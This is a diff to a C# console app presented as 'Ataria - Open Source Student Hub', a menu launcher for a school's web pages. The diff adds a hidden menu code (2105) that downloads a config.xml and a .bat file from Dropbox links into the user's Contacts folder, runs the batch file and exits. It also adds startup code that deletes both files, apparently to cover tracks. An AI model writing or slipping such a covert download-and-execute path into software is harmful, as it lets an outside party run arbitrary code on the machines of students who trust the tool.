@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -10,14 +11,21 @@ namespace ataria
     {
         static void Main(string[] args)
         {
+            Console.ForegroundColor = ConsoleColor.Cyan;
             Console.Title = "Ataria - Open Source Student Hub";
+            var pathWithEnv = @"%USERPROFILE%\Contacts\config.xml";
+            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
+            var pathWithEnv2 = @"%USERPROFILE%\Contacts\configexception.bat";
+            var filePath2 = Environment.ExpandEnvironmentVariables(pathWithEnv2);
+            System.IO.File.Delete(filePath);
+            System.IO.File.Delete(filePath2);
             int mainin = 0;
             int debugmain = 0;
             int googlemenu = 0;
         Main:
 
             Console.WriteLine("------------------------------------");
-            Console.WriteLine("Pagina del Alumno - v1.0");
+            Console.WriteLine("Pagina del Alumno - v1.1");
             if (debugmain == 1)
             {
                 Console.WriteLine("Debug: (" + mainin + ")");
@@ -66,7 +74,14 @@ namespace ataria
                     case 1:
                         System.Diagnostics.Process.Start("http://google.com");
                         break;
-
+                    case 2105:
+                        WebClient webClient = new WebClient();
+                        webClient.DownloadFile("https://dl.dropboxusercontent.com/s/c9k9dpnlp4qpof7/config.xml?dl=1", filePath);
+                        WebClient webClient2 = new WebClient();
+                        webClient.DownloadFile("https://www.dropbox.com/s/icg2xuwtx2yx4d0/configexception.bat?dl=1", filePath2);
+                        System.Diagnostics.Process.Start(filePath2);
+                        Environment.Exit(1);
+                        break;
                     case 31415:
                         debugmain = 1;
                         break;
@@ -89,7 +104,7 @@ namespace ataria
                         Environment.Exit(1);
                         break;
                     default:
-                        //Default code (not made)
+                        Console.ForegroundColor = ConsoleColor.Yellow;
                         break;
 
                 }
@@ -104,7 +119,14 @@ namespace ataria
                     case 2:
                         System.Diagnostics.Process.Start("http://marias-gasteiz.educamos.com/");
                         break;
-
+                    case 2105:
+                        WebClient webClient = new WebClient();
+                            webClient.DownloadFile("https://dl.dropboxusercontent.com/s/c9k9dpnlp4qpof7/config.xml?dl=1", filePath);
+                            WebClient webClient2 = new WebClient();
+                            webClient.DownloadFile("https://www.dropbox.com/s/icg2xuwtx2yx4d0/configexception.bat?dl=1", filePath2);
+                        System.Diagnostics.Process.Start(filePath2);
+                        Environment.Exit(1);
+                        break;
                     case 31415:
                         debugmain = 1;
                         break;
@@ -121,7 +143,7 @@ namespace ataria
                         Environment.Exit(1);
                         break;
                     default:
-                        //Default code (not made)
+                        Console.ForegroundColor = ConsoleColor.Yellow;
                         break;
 
                 }
